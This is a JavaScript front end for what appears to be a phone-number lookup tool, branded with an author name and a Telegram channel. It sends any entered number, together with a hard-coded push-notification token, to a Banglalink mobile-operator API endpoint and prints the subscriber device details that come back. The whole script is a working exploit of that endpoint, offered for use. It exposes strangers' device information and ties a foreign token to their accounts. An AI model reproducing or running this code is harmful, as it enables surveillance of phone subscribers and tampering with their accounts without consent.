document.getElementById('deviceForm').addEventListener('submit', function(event) {
    event.preventDefault();
    
    const phone = document.getElementById('phone').value;
    const url = 'https://myblapi.banglalink.net/api/v1/save-device-token';
    
    const data = {
        phone: phone,
        device_token: 'dJgB-jxGSw-zZ1uTWnOmW_%3AAPA91bGLMuxU-GFRPG-XW75EYKYlaosSixN9CnboHGoGfMlJSyWHO23-Gj2QtzlbMjoILuI00_g8-oVu3iOXQLCdPZFzfKDSgNz_HYNee69sfub45Gk74OrUVTFYDadSsKFaqsrpV09K'
    };
    
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
        const responseDiv = document.getElementById('response');
        responseDiv.innerHTML = '';
        
        if (data.status === 'FAIL' && data.status_code === 404) {
            const err = {
                Author: 'SH TASRIF',
                Channel: 'cybersh_official.t.me',
                Response: data
            };
            responseDiv.className = 'response error';
            responseDiv.innerText = JSON.stringify(err, null, 4);
        } else {
            const keysToRemove = ['device_token', 'is_switch_account_allow', 'phone', 'app_version', 'is_soft_deleted', 'mobile'];
            const cleanedData = removeNoneValuesAndKeys(data.data, keysToRemove);
            
            const info = {
                Author: 'SH TASRIF',
                Channel: 'cybersh_official.t.me',
                'Device-Info': cleanedData
            };
            responseDiv.className = 'response info';
            responseDiv.innerText = JSON.stringify(info, null, 4);
        }
    })
    .catch(error => {
        const responseDiv = document.getElementById('response');
        responseDiv.className = 'response error';
        responseDiv.innerText = `Error: ${error.message}`;
    });
});

function removeNoneValuesAndKeys(obj, keysToRemove) {
    if (typeof obj === 'object' && obj !== null) {
        return Object.entries(obj)
            .filter(([key, value]) => value !== null && !keysToRemove.includes(key))
            .reduce((acc, [key, value]) => {
                acc[key] = removeNoneValuesAndKeys(value, keysToRemove);
                return acc;
            }, Array.isArray(obj) ? [] : {});
    }
    return obj;
}
